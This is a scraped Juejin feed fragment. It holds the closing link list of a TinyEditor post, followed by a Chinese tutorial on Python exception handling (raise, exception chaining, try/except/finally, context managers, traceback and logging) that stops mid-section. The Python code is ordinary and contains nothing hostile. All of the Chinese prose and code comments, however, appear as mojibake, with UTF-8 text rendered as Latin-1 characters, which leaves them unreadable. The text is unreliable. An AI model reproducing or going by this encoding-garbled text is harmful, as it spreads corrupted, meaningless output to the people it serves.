<h2 data-id="heading-17">å¾€æœŸæ¨èæ–‡ç« </h2>
<ul>
<li><a href="https://juejin.cn/post/7403618336952418314" target="_blank" title="https://juejin.cn/post/7403618336952418314">ğŸ‘TinyEditorï¼šä¸€ä¸ªåŸºäº Quill 2.0 çš„å¯Œæ–‡æœ¬ç¼–è¾‘å™¨ï¼ŒåŠŸèƒ½å¼ºå¤§ã€å¼€ç®±å³ç”¨ï¼</a></li>
<li><a href="https://juejin.cn/post/7430505409176289320" target="_blank" title="https://juejin.cn/post/7430505409176289320">ğŸˆTinyEditor å¯Œæ–‡æœ¬å¼€æº2ä¸ªæœˆçš„æ€»ç»“ï¼šå¢åŠ æ ¼å¼åˆ·ã€æˆªå±ã€TypeScript ç±»å‹å£°æ˜ç­‰æ–°ç‰¹æ€§</a></li>
<li><a href="https://juejin.cn/post/7436030236784214068" target="_blank" title="https://juejin.cn/post/7436030236784214068">ğŸ¥³é‡ç£…æ›´æ–°ï¼TinyEditor å¼€æºå¯Œæ–‡æœ¬æ”¯æŒ LaTeX å¯ç¼–è¾‘å…¬å¼å•¦~</a></li>
<li><a href="https://juejin.cn/post/7406347285901426728" target="_blank" title="https://juejin.cn/post/7406347285901426728">ğŸ‰å–œæŠ¥ï¼TinyEditor å¼€æºå¯Œæ–‡æœ¬è¿æ¥äº†ç¬¬ä¸€ä½è´¡çŒ®è€…</a></li>
<li><a href="https://juejin.cn/post/7442330442606051338" target="_blank" title="https://juejin.cn/post/7442330442606051338">ğŸ‘è®©æˆ‘ä»¬ä¸€èµ·æ¥å»ºè®¾ TinyEditor å¼€æºå¯Œæ–‡æœ¬ç¼–è¾‘å™¨å§ï¼</a></li>
<li><a href="https://juejin.cn/post/7455243039655067657" target="_blank" title="https://juejin.cn/post/7455243039655067657">âœ¨TinyEditor v3.25.0 æ­£å¼å‘å¸ƒï¼2025å¹´ç¬¬ä¸€ä¸ªç‰ˆæœ¬ï¼Œå¢åŠ æ ‡é¢˜åˆ—è¡¨å¯¼èˆªã€åˆ†éš”çº¿ç­‰å®ç”¨ç‰¹æ€§</a></li>
<li><a href="https://juejin.cn/post/7527182608340484139" target="_blank" title="https://juejin.cn/post/7527182608340484139">âš¡ï¸TinyEditor v4.0 alpha ç‰ˆæœ¬å‘å¸ƒï¼šæ›´å¼ºå¤§çš„è¡¨æ ¼ã€æ›´ä¸°å¯Œçš„è¡¨æƒ…ã€æ›´å¥½çš„ä¸Šä¼ ä½“éªŒ</a></li>
</ul>
<h2 data-id="heading-18">è”ç³»æˆ‘ä»¬</h2>
<p>GitHubï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-editor" target="_blank" title="https://github.com/opentiny/tiny-editor" ref="nofollow noopener noreferrer">github.com/opentiny/tiâ€¦</a>ï¼ˆæ¬¢è¿ Star â­ï¼‰</p>
<p>å®˜ç½‘ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fopentiny.github.io%2Ftiny-editor" target="_blank" title="https://opentiny.github.io/tiny-editor" ref="nofollow noopener noreferrer">opentiny.github.io/tiny-editor</a></p>
<p>ä¸ªäººåšå®¢ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fkagol.github.io%2Fblogs%2F" target="_blank" title="https://kagol.github.io/blogs/" ref="nofollow noopener noreferrer">kagol.github.io/blogs/</a></p>
<p>å°åŠ©æ‰‹å¾®ä¿¡ï¼šopentiny-official</p>
<p>å…¬ä¼—å·ï¼šOpenTiny</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[python çš„å¼‚å¸¸æŠ›å‡ºæœºåˆ¶]]></title>    <link>https://juejin.cn/post/7592548677744312366</link>    <guid>https://juejin.cn/post/7592548677744312366</guid>    <pubDate>2026-01-08T03:15:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592548677744312366" data-draft-id="7591969856578191410" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="python çš„å¼‚å¸¸æŠ›å‡ºæœºåˆ¶"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2026-01-08T03:15:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·430351025068"/> <meta itemprop="url" content="https://juejin.cn/user/2578777865980459"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            python çš„å¼‚å¸¸æŠ›å‡ºæœºåˆ¶
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2578777865980459/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·430351025068
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T03:15:14.000Z" title="Thu Jan 08 2026 03:15:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»15åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1ã€python è¯­æ³•</h2>
<h3 data-id="heading-1">1.1 å¼‚å¸¸æŠ›å‡º åŸºæœ¬è¯­æ³•</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">"è¾“å…¥æ ¼å¼æœ‰è¯¯"</span>)        <span class="hljs-comment"># æŠ›å‡ºå†…ç½®å¼‚å¸¸</span>
<span class="hljs-keyword">raise</span> ValueError()  <span class="hljs-comment"># ä½¿ç”¨é»˜è®¤æ¶ˆæ¯      # æŠ›å‡ºå¼‚å¸¸å®ä¾‹</span>
</code></pre>
<h3 data-id="heading-2">1.2 å¼‚å¸¸é“¾ï¼š è¯­æ³•** raise æ–°å¼‚å¸¸ from åŸå§‹å¼‚å¸¸ **</h3>
<ul>
<li>
<p>Python çš„ ä¼˜é›… å¼‚å¸¸é“¾ï¼ˆException Chainingï¼‰è¯­æ³•ï¼Œç”¨äºå°†ä¸€ä¸ªå¼‚å¸¸ä¸å¦ä¸€ä¸ªå¼‚å¸¸å…³è”èµ·æ¥ã€‚</p>
<ul>
<li>å½¢æˆå¼‚å¸¸çš„"å› æœå…³ç³»"</li>
<li>ä½¿ç”¨ from ä¿ç•™åŸå§‹å¼‚å¸¸</li>
<li>å¼‚å¸¸è½¬æ¢/å¼‚å¸¸åŒ…è£…ï¼ˆå¦‚ä¸šåŠ¡å¼‚å¸¸åŒ…è£…æŠ€æœ¯å¼‚å¸¸ï¼‰</li>
</ul>
</li>
<li>
<p>ç”¨ä¾‹å±•ç¤º</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ä¼˜åŠ¿ï¼šä¸åŒå±‚çœ‹åˆ°ä¸åŒæŠ½è±¡çº§åˆ«çš„å¼‚å¸¸ï¼</span>
<span class="hljs-comment"># æŒ‰å±‚æ¬¡å®šä¹‰å¼‚å¸¸</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">UserError</span>(<span class="hljs-title class_ inherited__">Exception</span>):
    <span class="hljs-string">"""ç”¨æˆ·å±‚å¼‚å¸¸ï¼ˆç›´æ¥å±•ç¤ºç»™ç”¨æˆ·ï¼‰"""</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">BusinessError</span>(<span class="hljs-title class_ inherited__">Exception</span>):
    <span class="hljs-string">"""ä¸šåŠ¡å±‚å¼‚å¸¸ï¼ˆè®°å½•æ—¥å¿—ï¼Œè½¬æ¢ä¸ºUserErrorï¼‰"""</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">DataError</span>(<span class="hljs-title class_ inherited__">Exception</span>):
    <span class="hljs-string">"""æ•°æ®å±‚å¼‚å¸¸ï¼ˆè®°å½•è¯¦ç»†æ—¥å¿—ï¼‰"""</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-comment"># æ•°æ®å±‚</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">save_to_database</span>(<span class="hljs-params">data</span>):
    <span class="hljs-keyword">try</span>:
        db.insert(data)
    <span class="hljs-keyword">except</span> DatabaseError <span class="hljs-keyword">as</span> e:
        <span class="hljs-keyword">raise</span> DataError(<span class="hljs-string">f"æ•°æ®åº“æ“ä½œå¤±è´¥: <span class="hljs-subst">{e}</span>"</span>) <span class="hljs-keyword">from</span> e      <span class="hljs-comment"># åŸå§‹å¼‚å¸¸ä¼šè¢«é™„åŠ ä¸ºæ–°å¼‚å¸¸çš„ __cause__</span>

<span class="hljs-comment"># ä¸šåŠ¡å±‚</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">process_user_order</span>(<span class="hljs-params">order</span>):
    <span class="hljs-keyword">try</span>:
        save_to_database(order)
        send_notification(order)
    <span class="hljs-keyword">except</span> DataError <span class="hljs-keyword">as</span> e:
        log_error(e)  <span class="hljs-comment"># è®°å½•æŠ€æœ¯ç»†èŠ‚</span>
        <span class="hljs-keyword">raise</span> UserError(<span class="hljs-string">"è®¢å•å¤„ç†å¤±è´¥ï¼Œè¯·è”ç³»å®¢æœ"</span>) <span class="hljs-keyword">from</span> e      <span class="hljs-comment"># è½¬æ¢ä¸ºç”¨æˆ·å‹å¥½çš„å¼‚å¸¸</span>

<span class="hljs-comment"># ç”¨æˆ·å±‚ï¼ˆå±•ç¤ºç»™ç”¨æˆ·ï¼‰</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_request</span>():
    <span class="hljs-keyword">try</span>:
        process_user_order(order_data)
    <span class="hljs-keyword">except</span> UserError <span class="hljs-keyword">as</span> e:
        show_error_message(<span class="hljs-built_in">str</span>(e))  <span class="hljs-comment"># æ˜¾ç¤ºå‹å¥½ä¿¡æ¯</span>
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        log_error(e)
        show_error_message(<span class="hljs-string">"ç³»ç»Ÿé”™è¯¯ï¼Œè¯·ç¨åé‡è¯•"</span>)
</code></pre>
</li>
</ul>
<h3 data-id="heading-3">1.3 åœ¨å‡½æ•°ä¸­å£°æ˜å¼‚å¸¸ï¼Œ <strong>é€šè¿‡ raise</strong></h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">divide</span>(<span class="hljs-params">a: <span class="hljs-built_in">float</span>, b: <span class="hljs-built_in">float</span></span>) -&gt; <span class="hljs-built_in">float</span>:
    <span class="hljs-keyword">if</span> b == <span class="hljs-number">0</span>:
        <span class="hljs-keyword">raise</span> ZeroDivisionError(<span class="hljs-string">"é™¤æ•°ä¸èƒ½ä¸º 0"</span>)
    <span class="hljs-keyword">return</span> a / b
</code></pre>
<h3 data-id="heading-4">1.4 å¼‚å¸¸æ•è·ï¼ˆtry-exceptï¼‰</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ•è·å•ä¸ªå¼‚å¸¸</span>
<span class="hljs-keyword">try</span>:
    result = <span class="hljs-number">10</span> / <span class="hljs-number">0</span>
<span class="hljs-keyword">except</span> ZeroDivisionError <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ•è·åˆ°å¼‚å¸¸: <span class="hljs-subst">{e}</span>"</span>)
</code></pre>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ•è·å¤šä¸ªå¼‚å¸¸</span>
<span class="hljs-keyword">try</span>:
    value = <span class="hljs-built_in">int</span>(<span class="hljs-string">"abc"</span>)
<span class="hljs-keyword">except</span> (ValueError, TypeError) <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ç±»å‹æˆ–å€¼é”™è¯¯: <span class="hljs-subst">{e}</span>"</span>)
</code></pre>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ•è·æ‰€æœ‰ Exceptionç±» å¼‚å¸¸ï¼ˆâŒä¸€è‚¡è„‘/æœªæ‹†åˆ†ï¼Œä¸æ¨èï¼‰</span>
<span class="hljs-keyword">try</span>:
    risky_operation()
<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å‘ç”Ÿå¼‚å¸¸: <span class="hljs-subst">{e}</span>"</span>)
</code></pre>
<h3 data-id="heading-5">1.5 å®Œæ•´çš„å¼‚å¸¸å¤„ç†ç»“æ„</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">try</span>:
    <span class="hljs-comment"># å¯èƒ½æŠ›å‡ºå¼‚å¸¸çš„ä»£ç </span>
    result = <span class="hljs-number">10</span> / <span class="hljs-number">0</span>
<span class="hljs-keyword">except</span> ZeroDivisionError <span class="hljs-keyword">as</span> e:
    <span class="hljs-comment"># æ•è·ç‰¹å®šå¼‚å¸¸</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"é™¤é›¶é”™è¯¯: <span class="hljs-subst">{e}</span>"</span>)
<span class="hljs-keyword">except</span> ValueError <span class="hljs-keyword">as</span> e:
    <span class="hljs-comment"># æ•è·å¦ä¸€ç§å¼‚å¸¸</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å€¼é”™è¯¯: <span class="hljs-subst">{e}</span>"</span>)
<span class="hljs-keyword">else</span>:
    <span class="hljs-comment"># æ²¡æœ‰å¼‚å¸¸æ—¶æ‰§è¡Œ</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"è®¡ç®—æˆåŠŸ"</span>)
<span class="hljs-keyword">finally</span>:
    <span class="hljs-comment"># æ— è®ºæ˜¯å¦å¼‚å¸¸éƒ½æ‰§è¡Œ</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ¸…ç†èµ„æº"</span>)
</code></pre>
<ul>
<li>ä½¿ç”¨ with æ‰“å¼€æ–‡ä»¶æ—¶ï¼Œå³ä½¿å‘ç”Ÿå¼‚å¸¸ï¼Œæ–‡ä»¶ä¹Ÿä¼šæ­£ç¡®å…³é—­
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># è‡ªåŠ¨ç®¡ç†èµ„æº</span>
<span class="hljs-comment"># å¤šä¸ªä¸Šä¸‹æ–‡ç®¡ç†å™¨</span>
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">"input.txt"</span>, <span class="hljs-string">"r"</span>) <span class="hljs-keyword">as</span> fin, <span class="hljs-built_in">open</span>(<span class="hljs-string">"output.txt"</span>, <span class="hljs-string">"w"</span>) <span class="hljs-keyword">as</span> fout:
    data = fin.read()
    fout.write(processed_data)
</code></pre>
</li>
<li>è‡ªå®šä¹‰ä¸Šä¸‹æ–‡ç®¡ç†å™¨
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> contextlib <span class="hljs-keyword">import</span> contextmanager

<span class="hljs-meta">@contextmanager</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">database_transaction</span>():
    <span class="hljs-string">"""æ•°æ®åº“äº‹åŠ¡ä¸Šä¸‹æ–‡ç®¡ç†å™¨"""</span>
    conn = connect_database()
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">yield</span> conn
        conn.commit()
    <span class="hljs-keyword">except</span> Exception:
        conn.rollback()
        <span class="hljs-keyword">raise</span>
    <span class="hljs-keyword">finally</span>:
        conn.close()

<span class="hljs-comment"># ä½¿ç”¨</span>
<span class="hljs-keyword">with</span> database_transaction() <span class="hljs-keyword">as</span> conn:
    conn.execute(<span class="hljs-string">"INSERT INTO users VALUES (?, ?)"</span>, (<span class="hljs-string">"Alice"</span>, <span class="hljs-number">25</span>))
</code></pre>
</li>
</ul>
<h3 data-id="heading-6">1.6 å¼‚å¸¸ä¿¡æ¯è®¿é—®</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">try</span>:
    <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">"è‡ªå®šä¹‰é”™è¯¯æ¶ˆæ¯"</span>)
<span class="hljs-keyword">except</span> ValueError <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ¶ˆæ¯: <span class="hljs-subst">{e}</span>"</span>)             <span class="hljs-comment"># å¼‚å¸¸æ¶ˆæ¯</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ç±»å‹: <span class="hljs-subst">{<span class="hljs-built_in">type</span>(e).__name__}</span>"</span>)      <span class="hljs-comment"># å¼‚å¸¸ç±»å‹</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å‚æ•°: <span class="hljs-subst">{e.args}</span>"</span>)        <span class="hljs-comment"># å¼‚å¸¸å‚æ•°</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å­—ç¬¦ä¸²: <span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>)      <span class="hljs-comment"># å¼‚å¸¸çš„å­—ç¬¦ä¸²è¡¨ç¤º   </span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Repr: <span class="hljs-subst">{<span class="hljs-built_in">repr</span>(e)}</span>"</span>)       <span class="hljs-comment"># å¼‚å¸¸çš„ repr</span>
</code></pre>
<h3 data-id="heading-7">1.7 å¼‚å¸¸ä¼ æ’­æœºåˆ¶ï¼šå¼‚å¸¸æ²¿ç€è°ƒç”¨æ ˆå‘ä¸Šä¼ æ’­</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">function_c</span>():
    <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">"åº•å±‚é”™è¯¯"</span>)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">function_b</span>():
    function_c()  <span class="hljs-comment"># å¼‚å¸¸ä»è¿™é‡Œå¼€å§‹ä¼ æ’­</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">function_a</span>():
    <span class="hljs-keyword">try</span>:
        function_b()
    <span class="hljs-keyword">except</span> ValueError <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"åœ¨ function_a ä¸­æ•è·: <span class="hljs-subst">{e}</span>"</span>)

function_a()  <span class="hljs-comment"># è¾“å‡º: åœ¨ function_a ä¸­æ•è·: åº•å±‚é”™è¯¯</span>
<span class="hljs-comment"># function æ˜¯ æ ‡å‡† æ‹¼å†™ ï¼ï¼</span>
</code></pre>
<h2 data-id="heading-8">2ã€è°ƒè¯•å¼‚å¸¸</h2>
<h3 data-id="heading-9">2.1 å¼‚å¸¸å›æº¯æŸ¥çœ‹</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> traceback

<span class="hljs-keyword">try</span>:
    <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">"æµ‹è¯•å¼‚å¸¸"</span>)
<span class="hljs-keyword">except</span> Exception:
    traceback.print_exc()        <span class="hljs-comment"># æ‰“å°å®Œæ•´çš„å¼‚å¸¸å›æº¯</span>
    
    tb_info = traceback.format_exc()        <span class="hljs-comment"># è·å–å›æº¯ä¿¡æ¯</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å¼‚å¸¸ä¿¡æ¯:\n<span class="hljs-subst">{tb_info}</span>"</span>)
</code></pre>
<h3 data-id="heading-10">2.2 ä½¿ç”¨ logging è®°å½•å¼‚å¸¸</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> logging

logger = logging.getLogger(__name__)

<span class="hljs-keyword">try</span>:
    risky_operation()
<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
    logger.error(<span class="hljs-string">"æ“ä½œå¤±è´¥"</span>, exc_info=<span class="hljs-literal">True</span>)         <span class="hljs-comment"># è®°å½•å¼‚å¸¸ï¼ŒåŒ…å«å †æ ˆä¿¡æ¯</span>
    logger.exception(<span class="hljs-string">"æ“ä½œå¤±è´¥"</span>)            <span class="hljs-comment"># æˆ–ç®€å†™å½¢å¼</span>
</code></pre>
<h2 data-id="heading-11">3ã€é¡¹ç›®ä¸­çš„åº”ç”¨æ€»ç»“</h2>
<h3 data-id="heading-12">3.1 ä»¥ä¸‹è®¾è®¡ä½¿å¾—ä»£ç å¥å£®ã€å¯ç»´æŠ¤ï¼Œå¹¶ä¸”æ˜“äºè°ƒè¯•ã€‚</h3>
<ul>
<li>å®šä¹‰æ¸…æ™°çš„å¼‚å¸¸å±‚æ¬¡ï¼šå¦‚ AgentError ä½œä¸ºåŸºç±»ï¼Œæ´¾ç”Ÿå‡ºå…·ä½“å¼‚å¸¸</li>
<li>åœ¨æ–‡æ¡£ä¸­å£°æ˜å¼‚å¸¸ï¼šä½¿ç”¨ Raises: éƒ¨åˆ†</li>
<li>å¼‚å¸¸ä¼ æ’­ï¼šåº•å±‚æŠ›å‡ºï¼Œä¸Šå±‚æ•è·å¤„ç†</li>
<li>é”™è¯¯æ—¥å¿—ï¼šä½¿ç”¨ logger.error() è®°å½•å¼‚å¸¸</li>
<li>èµ„æºæ¸…ç†ï¼šåœ¨å¼‚å¸¸å‘ç”Ÿæ—¶æ¸…ç†èµ„æºï¼ˆå¦‚ self.messages.pop()ï¼‰</li>
</ul>
<h3 data-id="heading-13">3.2 å¥½çš„ç¤ºä¾‹</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># âœ… æ•è·ç‰¹å®šçš„å¼‚å¸¸</span>
<span class="hljs-keyword">try</span>:
    data = parse_json(json_string)
<span class="hljs-keyword">except</span> json.JSONDecodeError <span class="hljs-keyword">as</span> e:
    logger.error(<span class="hljs-string">f"JSON è§£æå¤±è´¥: <span class="hljs-subst">{e}</span>"</span>)
    handle_error()
</code></pre>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># âœ… æä¾›æœ‰æ„ä¹‰çš„é”™è¯¯æ¶ˆæ¯</span>
<span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">f"å¹´é¾„ <span class="hljs-subst">{age}</span> æ— æ•ˆï¼Œå¿…é¡»åœ¨ 0 åˆ° 150 ä¹‹é—´"</span>)
</code></pre>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># âœ… ä½¿ç”¨å¼‚å¸¸é“¾ä¿ç•™ä¸Šä¸‹æ–‡</span>
<span class="hljs-keyword">try</span>:
    load_config()
<span class="hljs-keyword">except</span> IOError <span class="hljs-keyword">as</span> e:
    <span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">"æ— æ³•åŠ è½½é…ç½®"</span>) <span class="hljs-keyword">from</span> e
</code></pre>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># âœ… åœ¨æ–‡æ¡£ä¸­å£°æ˜å¯èƒ½æŠ›å‡ºçš„å¼‚å¸¸</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">connect_database</span>(<span class="hljs-params">url: <span class="hljs-built_in">str</span></span>) -&gt; Connection:
    <span class="hljs-string">"""
    è¿æ¥åˆ°æ•°æ®åº“
    
    Raises:
        ConnectionError: è¿æ¥å¤±è´¥æ—¶æŠ›å‡º
        TimeoutError: è¿æ¥è¶…æ—¶æ—¶æŠ›å‡º
    """</span>
    <span class="hljs-keyword">pass</span>
</code></pre>
<h3 data-id="heading-14">3.3 ä¸æ°å½“ç¤ºä¾‹</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># âŒ æ•è·æ‰€æœ‰å¼‚å¸¸ä½†ä¸å¤„ç†</span>
<span class="hljs-keyword">try</span>:
    do_something()
<span class="hljs-keyword">except</span>:
    <span class="hljs-keyword">pass</span>  <span class="hljs-comment"># åæ‰æ‰€æœ‰å¼‚å¸¸</span>
</code></pre>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># âŒ ä½¿ç”¨è£¸ except</span>
